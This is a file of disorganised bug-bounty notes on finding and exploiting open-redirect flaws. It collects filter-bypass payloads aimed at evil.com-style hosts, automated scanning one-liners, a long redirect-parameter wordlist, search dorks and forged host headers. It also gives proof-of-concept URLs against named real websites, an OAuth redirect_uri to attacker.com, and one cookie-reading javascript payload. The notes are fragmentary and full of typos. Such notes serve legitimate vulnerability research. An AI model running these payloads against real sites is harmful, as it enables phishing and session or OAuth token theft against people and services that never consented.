@@ -1,0 +1,644 @@
+Open redirect
+==========
+
+
+https://xyz.com/bing.com
+https://xyz.com//bing.com
+https://xyz.com//https://bing.com/?evil.com
+https://xyz.com/?logout=1
+https://xyz.com/$test$  send to intruder add payload list check 301 and some time opetin setting and follw redirection 200 ok
+
+
+https://xyz.com/ send to burpsuite and send to spider and find all vulnerable parameter 
+
+test payload 
+
+
+search in burpsuite in vulnerable parameter
+
+I spotted an open redirect in just 5 minutes this way, earning just €100
+
+Tools I use:
+• Hakrawler for extracting JavaScript files.
+• LinkFinder for endpoint discovery in JS files.
+
+
+Steps To Reproduce:
+
+    open any browser
+    enter https://www.tumblr.com/logout?redirect_to=https://evil.com%5C%40www.tumblr.com
+
+
+echo "http://tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
+
+Easy way to find Open redirect. 
+Use waybackurls and grep the perameter http and check 302 status code. Then open all 302 url in browser and which one is redirect http://target.com to http://sub.target.com, change the http://sub.target.com to https://evil.com. https://pic.x.com
+
+//evil,org
+https://evil.com
+@evil.cpm
+https:evil.com
+
+aHR0cHM6Ly90YXJnZXQtc2l0ZS5jb21tdW5pdHkvdGVzdA==
+
+
+Tried everything 403 forbidden  
+Tried this Payload : "><a href="//bing.com">Redirect</a>  Worked fine 
+
+find Parameter 
+
+Next=
+Redirect=
+RedirectUrl=
+ReturnUrl=
+Url=
+action=
+action_url=
+allinurl:
+authstate=
+backUrl
+backurl=
+burl=
+callback=
+callback_url=
+cgi-binredirect.cgi
+checkout_url=
+clicku=
+clickurl=
+continue=
+data=
+dest=
+dest= 
+destination=
+desturl=
+dir=
+domain=
+ext=
+feed=
+file=
+forward=
+forward_url=
+forwarded=
+from=
+go=
+go=evil.com
+goTo
+goto=
+host=
+html=
+image_url=
+img=
+jump=
+jump_url=
+jurl=
+l=
+langto=
+link=
+linkAddress=
+locatin=
+location=
+locationUrl
+login=
+loginto=
+logout=
+navigation=
+next=
+old=
+open=
+origin=
+originUrl=
+out
+out=
+page=
+path=
+pic=
+port=
+q=
+qurl=
+r=
+r_url
+recurl=
+red=
+redir=
+redirect
+redirect=
+redirect_uri=
+redirect_url=
+ref=
+referer=
+referrer=
+refrence=
+request=
+ret=
+return=
+returnTo
+returnTo=
+returnUri
+returnUrl
+returnUrl=
+return_path=
+return_to=
+return_uri
+return_url
+rit_url=
+rturn=
+rurl=
+service=
+show=
+site=
+sp_url=
+src=
+state=
+success=
+successUrl
+target=
+tcsrc=
+to=
+tordrect=
+u1=
+u=
+uri=
+url=
+val=
+validate=
+view=
+window=
+
+
+ grep -E "Next=|Redirect=|RedirectUrl=|ReturnUrl=|Url=|action=|action_url=|authstate=|backUrlbackurl=|burl=|callback=|callback_url=|cgi-binredirect.cgicheckout_url=|clicku=|clickurl=|continue=|data=|dest=|dest=|destination=|desturl=|dir=|domain=|ext=|feed=|file=|forward=|forward_url=|forwarded=|from=|go=|go=|evil.comgoTogoto=|host=|html=|image_url=|img=|jump=|jump_url=|jurl=|l=|langto=|link=|linkAddress=|locatin=|location=|locationUrllogin=|loginto=|logout=|navigation=|next=|old=|open=|origin=|originUrl=|outout=|page=|path=|pic=|port=|q=|qurl=|r=|r_urlrecurl=|red=|redir=|redirectredirect=|redirect_uri=|redirect_url=|ref=|referer=|referrer=|refrence=|request=|ret=|return=|returnToreturnTo=|returnUrireturnUrlreturnUrl=|return_path=|return_to=|return_urireturn_urlrit_url=|rturn=|rurl=|service=|show=|site=|sp_url=|src=|state=|success=|successUrltarget=|tcsrc=|to=|tordrect=|u1=|u=|uri=|url=|val=|validate=|view=|window=|state="
+
+echo https://xyz.com |gau| uro| grep -E ".php|.aspx|.asp|.jsp| grep "="
+
+
+
+https://web.archive.org/cdx/search/cdx?url=*.example.be&fl=original&collapse=urlkey&filter=!mimetype:warc/revisit|text/css|image/jpeg|image/jpg|image/png|image/svg.xml|image/gif|image/tiff|image/webp|image/bmp|image/vnd|image/x-icon|image/vnd.microsoft.icon|font/ttf|font/woff|font/woff2|font/x-woff2|font/x-woff|font/otf|audio/mpeg|audio/wav|audio/webm|audio/aac|audio/ogg|audio/wav|audio/webm|video/mp4|video/mpeg|video/webm|video/ogg|video/mp2t|video/webm|video/x-msvideo|video/x-flv|application/font-woff|application/font-woff2|application/x-font-woff|application/x-font-woff2|application/vnd.ms-fontobject|application/font-sfnt|application/vnd.android.package-archive|binary/octet-stream|application/octet-stream|application/pdf|application/x-font-ttf|application/x-font-otf|video/webm|video/3gpp|application/font-ttf|audio/mp3|audio/x-wav|image/pjpeg|audio/basic|application/font-otf&filter=!statuscode:404|301|302&page=”
+
+
+py loads 
+
+
+https://github.com/coffinxp/loxs/blob/main/payloads/or.txt       coffin
+
+virus total use
+
+“https//doordie.fr/sfuser/connexion?redirectionUrl=https://google.com\.compte.doordie.fr/dashboard”
+
+this time i add the ‘\’ after .com. boom this redirected to google.
+
+
+
+subdomain 404  and siple add https://xyz.com//evil.com
+  page 404 find directory bruit force and open redirect
+
+
+
+aHR0cHM6Ly9ldmlsLmNvbSNmb29iYXI=  base 64
+Steps to Reproduce:
+1. Go to https://www.private.com
+2. Capture the request in the burpsuite
+3. Send this request to intruder
+4. Set payload after domain directly
+For ex: private.com/$test$
+5. Replace $test$ with your open redirect payloads.
+6. Add all open redirect payloads in the intruder
+7. Click on Start attack
+8. Check for 301 response
+
+
+
+https://vpnroaming.digitalocean.com.bing.com/
+
+
+ffuf -u https://example.com/path?FUZZ=https://evil.com -w /path/to/wordlist.txt   
+
+
+
+
+openredirex.py --url "http://xyz.com/lang/?returnURL=FUZZ"  --payloads paylods.txt
+
+ \
+
+
+ URL Redirection on Path Fragments 
+example – any.com/payloads
+any.com/bing.com
+any.com//bing.com
+
+
+find all parameter use burpsuite
+
+/$test$  use payload
+
+/bing.com/%2e%2e
+
+git clone https://github.com/devanshbatham/openredirex
+cd openredirex
+sudo chmod +x setup.sh
+./setup.sh
+
+
+cat list_of_urls.txt |  openredirex -p payloads.txt -k "FUZZ" -c 50
+
+
+open  redirect 
+
+|grep -a -i \=http |bhedak 'http://redirect.com' | while read host do;do curl -s -L $host -I |grep "redirect.com" && echo -e "$host\033[0;31mvulnerable\n" ; done
+
+
+cat allurls.txt | gf redirect | oprndirex.py -payload 
+
+cat par.txt | openredirex -k "Fuzz"
+
+git clone https://github.com/devanshbatham/openredirex & cd openredirex & chmod +x setup.sh 
+cd openredirex
+sudo chmod +x setup.sh
+./setup.sh
+
+
+echo target.com | (gau || hakrawler || waybackurls || katana) | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
+
+cat subs.txt | (gau || hakrawler || waybackurls || katana) | grep "=" | dedupe | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
+
+
+parameter  ===  
+
+
+site:*.*.parabol.co inurl:return= | inurl:return_to= | inurl:return_uri= | inurl:redirect= | inurl:redirect_to= | inurl:redirect_to= | inurl:redirect_uri= | inurl:prev= | inurl:prev_page= | inurl:next_page= | inurl:page=   | inurl:site= | inurl:next= | inurl:view= | inurl:back= | inurl:url= | inurl:to= | inurl:dest= | inurl:source= | inurl:from= | inurl:continue= | inurl:continue_to=  | inurl:go= | inurl:return_path= | inurl:checkout_url= | inurl:image= | inurl:http | inurl:image_url= | inurl:cgi_bin= | inurl:out= | inurl:windows= | inurl:show= | inurl:dir= | inurl:navigation= | inurl:file= | inurl:val= | inurl:validate= | inurl:domain= | inurl:feed= | inurl:port= | inurl:data= | inurl:host= | inurl:reference= | inurl:site= | inurl:html= | inurl:callback= 
+
+after use link goper web extension  extra all link  find   g=http://
+
+
+
+site: "www.xyz.com" inurl:return | inurl:url|
+
+
+
+Host: evil-website.com
+X-Forwarded-For: evil-website.com
+X-Forwarded-Host: evil-website.com
+X-Client-IP: evil-website.com
+X-Remote-IP: evil-website.com
+X-Remote-Addr: evil-website.com
+X-Host: evil-website.com
+X-Forwarded: evil.com
+True-Clint-IP:
+x-Clint-IP:
+Proxy-Clint-IP:
+origin:
+X-Originating-IP:
+
+
+
+
+
+How to exploit
+
+    Try change the domain
+
+/?redir=evil.com
+
+    Using a whitelisted domain or keyword
+
+/?redir=target.com.evil.com
+
+    Using // to bypass http blacklisted keyword
+
+/?redir=//evil.com
+
+    Using https: to bypass // blacklisted keyword
+
+/?redir=https:evil.com
+
+    Using \\ to bypass // blacklisted keyword
+
+/?redir=\\evil.com
+
+    Using \/\/ to bypass // blacklisted keyword
+
+/?redir=\/\/evil.com/
+/?redir=/\/evil.com/
+
+    Using %E3%80%82 to bypass . blacklisted character
+
+/?redir=evil。com
+/?redir=evil%E3%80%82com
+
+    Using null byte %00 to bypass blacklist filter
+
+/?redir=//evil%00.com
+
+    Using parameter pollution
+
+/?next=target.com&next=evil.com
+
+    Using @ or %40 character, browser will redirect to anything after the @
+
+/?redir=target.com@evil.com
+/?redir=target.com%40evil.com
+
+    Creating folder as their domain
+
+http://www.yoursite.com/http://www.theirsite.com/
+http://www.yoursite.com/folder/www.folder.com
+
+    Using ? characted, browser will translate it to /?
+
+/?redir=target.com?evil.com
+
+    Bypass the filter if it only checks for domain name using %23
+
+/?redir=target.com%23evil.com
+
+    Host/Split Unicode Normalization
+
+https://evil.c℀.example.com
+
+    Using parsing
+
+http://ⓔⓥⓘⓛ.ⓒⓞⓜ
+
+    Using ° symbol to bypass
+
+/?redir=target.com/°evil.com
+
+    Bypass the filter if it only allows yoou to control the path using a nullbyte %0d or %0a
+
+/?redir=/%0d/evil.com
+
+
+
+
+site:"selzy.com" inurl:redir|inurl:url|inurl:redirect|inurl:return|inurl:src=http|inurl:r=http|inurl:site|inurl:goto
+
+site:selzy.com inurl:redir | inurl:url | inurl:redirect | inurl:return|inurl:src=http | inurl:r=http | inurl:site | inurl:goto
+
+
+
+automation
+
+tool 
+
+paramsspider -d tesla.com | tee -a pat.xt
+cat waybackurls.txt | gf xss | sed 's/=.*/=/' | dalx pipe  
+
+openredirex tool
+
+git clone https://github.com/devanshbatham/openredirex && cd openredirex && chmod +x setup.sh
+
+cat pat.txt | openredirex tool -k "fuzz"
+cat list_of_urls.txt |  openredirex -p payloads.txt -k "FUZZ"
+
+cat parameter.txt |  openredirex.py  -k "FUZZ"
+
+
+
+use burpsuite
+
+
+
+
+https://promo.com/for/promo-security-bounty-program
+
+
+sent too templete
+
+
+
+
+
+cat allurls.txt | gf redirect | oprndirex.py -payload 
+
+
+
+
+
+|grep -a -i \=http |bhedak 'http://redirect.com' | while read host do;do curl -s -L $host -I |grep "redirect.com" && echo -e "$host\033[0;31mvulnerable\n" ; done
+
+
+
+
+
+
+
+tips
+
+-=================
+
+
+https://api.digitalocean.com@google.com    work always   page 404 not found
+
+-   https://example.com,@google.com   success  always 
+
+
+
+- https://www.<product>/login-redirect/?redirect=//any-domain.com
+
+Doesn't work❌
+
+https://www.<product>/login-redirect/?redirect=/any-domain.com
+
+
+- echo "http://tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew redirect.txt
+
+- payload: redirect_to=//evil.com\@whiteliste.com
+
+- ?next=whitelisted.com&next=google.com
+
+- http://localhost:8069/web/session/logout?redirect=https%3a%2f%2fsysdream.com%2f
+
+- https://www.example.com/account/login?next=https%3A%2F%2Fwww.example.com&next=@google.com
+
+-
+-   https://example.com,@google.com
+
+- http://supporthiring.shopify.com/apps/locksmith/resource/pages/gauntlet-challenge?&path=%2F%2Fevil.com
+Victim will be see a 404 error page and after 2 seconds he will be redirected to: https://evil.com
+
+- Open redirect tip:
+Target: http[s]://target-site.com
+Base64 payload: aHR0cHM6Ly90YXJnZXQtc2l0ZS5jb21tdW5pdHkvdGVzdA==
+(Decoded: http[s]://target-site.community/test)
+
+- http[s]://target-site.com/<base64_redirect>
+
+- First I collected all the subdomain
+
+assetfinder --subs-only redacted,com | httpx -silent | tee -a redacted.txt
+
+Crawl the parameter using Waybackurls and pass it to GF tool
+
+[1/n]
+
+cat redacted.txt | waybackurls | gf redirect | tee -a OPredacted.txt
+
+Then I found a parameter "?redirectURL="
+
+I tried to create an account to test if it is vulnerable to Open Redirect, then it was
+
+When I signed in I found that my session token was in a GET parameter
+
+Open Redirect:
+https://sub,redacted,com/signin?redirectURL=@google
+,com
+
+http://sub,redacted,com/login?redirectURL=http://evil,com --> redirect to http://sub,redacted,comhttp://evil,com
+
+http://sub,redacted,com/login?redirectURL=evil,com --> redirect to http://sub,redacted,comevil,com
+
+https://cloud.digitalocean.com.evil.com/
+
+-- https://domain.com/abc.php?redirect=https://sub.domain.com 
+
+
+https://domain.com/abc.php?redirect=http://evil.com
+
+
+waymore -i domain.com  -mode U -oU waymore_domain.com
+cat waymore_domain.com | grep "=http" | sort -u | uro > testurls.txt
+
+/login?redirectUrl=//evil,org --> redirect to evil,org
+
+
+
+Easy way to find Open redirect. 
+Use waybackurls and grep the perameter http and check 302 status code. Then open all 302 url in browser and which one is redirect http://target.com to http://sub.target.com, change the http://sub.target.com to https://evil.com. https://pic.x.com/EImOBsV0aY
+
+https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/
+-
+
+https://evil[.]com❌
+@evil[.]com❌
+
+https:evil[.]com✅
+
+
+This is how I found 40 open redirection in 2 weeks. Bugcrowd accept open redirect as P4🧵
+
+1. I collected all *,main domains 
+2. Used passive subdomain finding tools to find domains
+
+3. Used Gau and url crawlers to find logout pages
+4. After collecting logout pages I sent this data to burp suite.
+Mohsin Khan 🇮🇳
+@tabaahi_
+·
+Jun 21, 2022
+5. I used a param miner on all logout paths. To find parameter
+
+Param miner found redirect,url,uri, etc params. Tried open redirect payloads manually. And reported 40 open redirects.
+
+Tip:- find open redirection via url Structure 🪲
+
+One liner :- 
+
+httpx -l all-alive-subs.txt -path "///evil.com" -status-code -mc 302
+
+
+redacted.com///pratikdabhi.com — -> pratikdabhi.com
+
+
+https://domain.com/abc/xyz/zyc/html/redirect.html?url=aHR0cHM6Ly9ldmlsLmNvbSNmb29iYXI=
+
+
+redirect_to=////evil%E3%80%82com
+
+
+URL  : https://www.omise.co////bing.com/?www.omise.co/?category=interview&page=2  
+Parameter Type  : URL Rewrite  
+Attack Pattern  : %2f%2f%2fr87.com%2f%3fwww.omise.co%2f  
+How to Reproduce
+
+    Intercept the below url using Burpsuite & send it to repeater
+
+https://www.omise.co/?category=interview&page=2
+
+    Use this attack pattern
+
+/%2f%2f%2fbing.com%2f%3fwww.omise.co
+
+    Now it will redirect to bing.com
+
+Below i will give u the Rquest body & also attaching the screenshots
+GET /%2f%2f%2fbing.com%2f%3fwww.omise.co/?category=interview&page=2 HTTP/1.1
+Host: www.omise.co
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
+
+
+ https://www.semrush.com/redirect?url=http://bing.com
+
+GET /?logout=1 HTTP/2
+
+ https://hackerone.com/%2Fgoogle.com
+
+https://sehacure.slack.com/link?url=http://www.likelo.com
+
+https://shopify.dev/search/result?query=poc&rank=1&result_gid=ae6c33f6-62d4-4ff2-966e-96c09267ee87&result_url=%2Ftools%2Fapp-bridge%2Factions%2Fpos&search_uuid=34eeea9d-2b99-4f86-bf00-807efd4036ba&suggested=false
+
+https://shopify.dev/search/result?query=poc&rank=1&result_gid=ae6c33f6-62d4-4ff2-966e-96c09267ee87&result_url=@www.facebook.com&search_uuid=34eeea9d-2b99-4f86-bf00-807efd4036ba&suggested=false
+
+https://<account>.myshopify.com/account/logout?return_url=https://checkout.shopify.com/14372648
+
+https://www.zaption.com/logout?returnTo=///evil.com/
+
+http://victim.com/authorize?response_type=code&client_id=bc88FitX1298KPj2WS259BBMa9_KCfL3&scope=WRONG_SCOPE&redirect_uri=http://attacker.com
+
+https://www.vendhq.com//evil.com/
+
+https://hackerone.com/redirect?signature=43cd652c2f1835df993825d00bed0660f498fc42&url=http%3A%2F%2Fwww.google.com'
+
+Open Redirect Vulnerability:
+URL : https://www.affirm.com/
+User can be redirect to malicious site
+POC:https://www.affirm.com///google.com/?www.affirm.com/?category=interview&page=2
+
+
+https://demo.weblate.org/accounts/login/github/?next=///google.com
+
+www.semrush.com/login/?redirect_to=/\google.com
+
+ https://www.tumblr.com/logout?redirect_to=https://evil.com%5C%40www.tumblr.com
+
+ https://www.zomato.com/login?redirect_url=https://askdcodes.org
+
+
+https://mijn.werkenbijdefensie.nl/login?redirect_url=https://google.com
+
+https://www.8x8.com.example.com
+
+https://inventory.upserve.com/http://google.com/
+
+https://werkenbijdefensie.nl//codechoi.com/POC/Maximum/i.php?contrast=1
+https://support.nordvpn.com/#/path///google.com
+https://app.mopub.com/login?next=https://google.com
+
+http://127.0.0.1:8080/login/?next=/\google.com     
+
+https://cs.money///google.com
+https://www.blackrock.com/authplatform/user/activate-success?redirectUri=https://google.com
+stocky.shopifyapps.com/users/login?return_to=//evil.com
+
+https://m.uber.com//youtube.com/%2F..
+
+
+
+Steps To Reproduce:
+
+    Go To This Url :- https://www.zomato.com/login?redirect_url=https://askdcodes.org
+    Then login there
+    boom you got Redirected to askdcodes.org
+
+Steps To Reproduce:
+
+    Go to https://mijn.werkenbijdefensie.nl/login?redirect_url=https://google.com
+    Login using your valid Email & Password
+    You will be redirected to :
+
+
+
+
+
+
+
+
+
